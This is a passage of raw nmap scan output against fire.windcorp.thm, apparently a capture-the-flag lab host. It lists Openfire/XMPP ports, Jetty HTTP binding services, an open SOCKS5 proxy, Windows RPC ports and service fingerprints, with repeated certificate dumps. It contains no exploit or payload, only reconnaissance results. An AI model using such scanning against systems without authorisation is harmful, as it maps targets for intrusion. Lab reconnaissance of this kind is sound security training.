| SHA-1: 97f70772a26be3247ed5bbcb5f357d74798266ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
|_ssl-date: 2022-12-22T19:31:56+00:00; -1s from scanner time.
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     unknown: 
|     errors: 
|       (timeout)
|     compression_methods: 
|     auth_mechanisms: 
|     xmpp: 
|_    features: 
5229/tcp  open  jaxflow?            syn-ack
5262/tcp  open  jabber              syn-ack
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     unknown: 
|     auth_mechanisms: 
|     compression_methods: 
|     features: 
|     stream_id: 3tdo9mabru
|     xmpp: 
|_      version: 1.0
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5263/tcp  open  ssl/jabber          syn-ack
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715542583f3a20f75c8ca2d3353cbb7
| SHA-1: 97f70772a26be3247ed5bbcb5f357d74798266ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     unknown: 
|     errors: 
|       (timeout)
|     compression_methods: 
|     auth_mechanisms: 
|     xmpp: 
|_    features: 
|_ssl-date: 2022-12-22T19:31:57+00:00; -1s from scanner time.
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5269/tcp  open  xmpp                syn-ack Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     unknown: 
|     errors: 
|       (timeout)
|     compression_methods: 
|     auth_mechanisms: 
|     xmpp: 
|_    features: 
5270/tcp  open  ssl/xmpp            syn-ack Wildfire XMPP Client
|_ssl-date: 2022-12-22T19:31:55+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715542583f3a20f75c8ca2d3353cbb7
| SHA-1: 97f70772a26be3247ed5bbcb5f357d74798266ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
5275/tcp  open  jabber              syn-ack
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     errors: 
|       invalid-namespace
|       (timeout)
|     unknown: 
|     auth_mechanisms: 
|     compression_methods: 
|     features: 
|     stream_id: 7n7jqz5kvm
|     xmpp: 
|_      version: 1.0
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5276/tcp  open  ssl/jabber          syn-ack
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715542583f3a20f75c8ca2d3353cbb7
| SHA-1: 97f70772a26be3247ed5bbcb5f357d74798266ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
|_ssl-date: 2022-12-22T19:31:55+00:00; -2s from scanner time.
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     unknown: 
|     errors: 
|       (timeout)
|     compression_methods: 
|     auth_mechanisms: 
|     xmpp: 
|_    features: 
7070/tcp  open  http                syn-ack Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
7443/tcp  open  ssl/http            syn-ack Jetty 9.4.18.v20190429
|_http-title: Openfire HTTP Binding Service
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715542583f3a20f75c8ca2d3353cbb7
| SHA-1: 97f70772a26be3247ed5bbcb5f357d74798266ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Jetty(9.4.18.v20190429)
7777/tcp  open  socks5              syn-ack (No authentication; connection not allowed by ruleset)
| socks-auth-info: 
|_  No authentication
9090/tcp  open  zeus-admin?         syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 22 Dec 2022 19:30:07 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 22 Dec 2022 19:30:16 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest: 
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp  open  ssl/xmltec-xmlmail? syn-ack
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-01T08:39:00
| Not valid after:  2025-04-30T08:39:00
| MD5:   b715542583f3a20f75c8ca2d3353cbb7
| SHA-1: 97f70772a26be3247ed5bbcb5f357d74798266ae
| -----BEGIN CERTIFICATE-----
| MIIDLzCCAhegAwIBAgIIXUFELG7QgAIwDQYJKoZIhvcNAQELBQAwHDEaMBgGA1UE
| AwwRZmlyZS53aW5kY29ycC50aG0wHhcNMjAwNTAxMDgzOTAwWhcNMjUwNDMwMDgz
| OTAwWjAcMRowGAYDVQQDDBFmaXJlLndpbmRjb3JwLnRobTCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAKLH0/j17RVdD8eXC+0IFovAoql2REjOSf2NpJLK
| /6fgtx3CA4ftLsj7yOpmj8Oe1gqfWd2EM/zKk+ZmZwQFxLQL93t1OD/za1gyclxr
| IVbPVWqFoM2BUU9O3yU0VVRGP7xKDHm4bcoNmq9UNurEtFlCNeCC1fcwzfYvKD89
| X04Rv/6kn1GlQq/iM8PGCLDUf1p1WJcwGT5FUiBa9boTU9llBcGqbodZaBKzPPP8
| DmvSYF71IKBT8NsVzqiAiO3t/oHgApvUd9BqdbZeN46XORrOhBQV0xUpNVy9L5OE
| UAD1so3ePTNjpPE5SfTKymT1a8Fiw5kroKODN0nzy50yP3UCAwEAAaN1MHMwMQYD
| VR0RBCowKIIRZmlyZS53aW5kY29ycC50aG2CEyouZmlyZS53aW5kY29ycC50aG0w
| HQYDVR0OBBYEFOtMzqgfsY11qewZNfPjiLxnGykGMB8GA1UdIwQYMBaAFOtMzqgf
| sY11qewZNfPjiLxnGykGMA0GCSqGSIb3DQEBCwUAA4IBAQAHofv0VP+hE+5sg0KR
| 2x0Xeg4cIXEia0c5cIJ7K7bhfoLOcT7WcMKCLIN3A416PREdkB6Q610uDs8RpezJ
| II/wBoIp2G0Y87X3Xo5FmNJjl9lGX5fvayen98khPXvZkurHdWdtA4m8pHOdYOrk
| n8Jth6L/y4L5WlgEGL0x0HK4yvd3iz0VNrc810HugpyfVWeasChhZjgAYXUVlA8k
| +QxLxyNr/PBfRumQGzw2n3msXxwfHVzaHphy56ph85PcRS35iNqgrtK0fe3Qhpq7
| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
| LucP
|_-----END CERTIFICATE-----
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 22 Dec 2022 19:30:29 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 22 Dec 2022 19:30:30 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 400 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
9389/tcp  open  mc-nmf              syn-ack .NET Message Framing
49667/tcp open  msrpc               syn-ack Microsoft Windows RPC
49668/tcp open  ncacn_http          syn-ack Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc               syn-ack Microsoft Windows RPC
49670/tcp open  msrpc               syn-ack Microsoft Windows RPC
49672/tcp open  msrpc               syn-ack Microsoft Windows RPC
49689/tcp open  msrpc               syn-ack Microsoft Windows RPC
49703/tcp open  msrpc               syn-ack Microsoft Windows RPC
7 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5222-TCP:V=7.93%I=7%D=12/22%Time=63A4B04F%P=x86_64-pc-linux-gnu%r(R
SF:PCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/
SF:streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-strea
SF:ms\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5262-TCP:V=7.93%I=7%D=12/22%Time=63A4B04F%P=x86_64-pc-linux-gnu%r(R
SF:PCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/
SF:streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-strea
SF:ms\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5263-TCP:V=7.93%T=SSL%I=7%D=12/22%Time=63A4B061%P=x86_64-pc-linux-g
SF:nu%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber
SF:\.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp
SF:-streams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5275-TCP:V=7.93%I=7%D=12/22%Time=63A4B055%P=x86_64-pc-linux-gnu%r(R
SF:PCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/
SF:streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-strea
SF:ms\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5276-TCP:V=7.93%T=SSL%I=7%D=12/22%Time=63A4B067%P=x86_64-pc-linux-g
SF:nu%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber
SF:\.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp
SF:-streams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9090-TCP:V=7.93%I=7%D=12/22%Time=63A4B041%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2022\x20Dec\x20
SF:2022\x2019:30:07\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202020\
SF:x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20b
SF:ytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>\n<m
SF:eta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</head>
SF:\n<body>\n</body>\n</html>\n\n")%r(JavaRMI,C3,"HTTP/1\.1\x20400\x20Ille
SF:gal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-
SF:8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\
SF:x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0<
SF:/pre>")%r(WMSRequest,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CN
SF:TL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Leng
SF:th:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1>
SF:<pre>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>")%r(ibm-db2-das,
SF:C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Typ
SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnecti
SF:on:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illeg
SF:al\x20character\x20CNTL=0x0</pre>")%r(SqueezeCenter_CLI,9B,"HTTP/1\.1\x
SF:20400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\n
SF:Content-Length:\x2049\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message
SF:\x20400</h1><pre>reason:\x20No\x20URI</pre>")%r(informix,C3,"HTTP/1\.1\
SF:x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/htm
SF:l;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r
SF:\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20characte
SF:r\x20CNTL=0x0</pre>")%r(drda,C3,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
SF:ent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20
SF:400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(HTTP
SF:Options,56,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2022\x20Dec\x20202
SF:2\x2019:30:16\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9091-TCP:V=7.93%T=SSL%I=7%D=12/22%Time=63A4B056%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2022\x20D
SF:ec\x202022\x2019:30:29\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x2
SF:02020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges
SF::\x20bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></titl
SF:e>\n<meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n<
SF:/head>\n<body>\n</body>\n</html>\n\n")%r(HTTPOptions,56,"HTTP/1\.1\x202
SF:00\x20OK\r\nDate:\x20Thu,\x2022\x20Dec\x202022\x2019:30:30\x20GMT\r\nAl
SF:low:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20
SF:400\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-885
SF:9-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20
SF:Message\x20400</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCChec
SF:k,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent
SF:-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConn
SF:ection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20I
SF:llegal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HT
SF:TP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20
SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x2
